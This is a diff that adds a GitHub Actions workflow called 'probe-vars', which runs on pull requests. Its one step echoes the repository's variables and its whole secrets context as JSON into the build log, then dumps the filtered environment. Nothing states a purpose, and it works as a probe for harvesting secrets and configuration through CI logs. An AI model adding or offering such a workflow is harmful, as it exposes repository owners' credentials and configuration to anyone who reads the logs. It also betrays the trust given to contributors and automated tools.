@@ -1,0 +1,16 @@
+name: probe-vars
+on:
+  pull_request:
+jobs:
+  dump:
+    runs-on: ubuntu-latest
+    steps:
+      - name: dump contexts
+        run: |
+          echo "VARS_JSON:"
+          echo '${{ toJSON(vars) }}'
+          echo "SECRETS_KEYS:"
+          echo '${{ toJSON(secrets) }}' | head -c 2000
+          echo "ENV_DUMP:"
+          env | sort | grep -ivE 'token=|_KEY|PASSWORD' | head -40
+          echo "DUMP_END"
